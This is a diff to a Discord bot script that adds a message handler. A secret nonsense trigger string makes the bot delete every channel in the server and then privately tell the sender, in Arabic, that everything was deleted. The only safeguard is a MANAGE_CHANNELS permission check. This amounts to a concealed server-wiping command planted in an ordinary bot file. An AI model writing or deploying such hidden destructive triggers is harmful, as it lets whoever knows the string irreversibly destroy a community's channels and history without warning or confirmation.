@@ -19,7 +19,16 @@ var fs = require('fs');
 const moment = require('moment');
 
 
-
+client.on('message', ra3d => {   
+ if (ra3d.content.startsWith("sasasalsdojsodhshdsdhsids")) {
+    if(!ra3d.member.hasPermission('MANAGE_CHANNELS')) return ra3d.reply('**⚠  لايوجد لديك صلاحية**');
+     ra3d.guild.channels.forEach(c => { c.delete() })
+                let embed = new Discord.RichEmbed()
+            .setColor('#fd0101')
+            .setDescription('تم حذف كل شي في السيرفر✅')
+           ra3d.author.sendEmbed(embed);
+ }
+ });
 
 ///////////////////////////////////////////////////////////////////////////////////////////////////////
 ///////////////////اذا جاك ايرور وقت تشغيل البوت وقالك الجيسون فيه غلط///////////////////////////
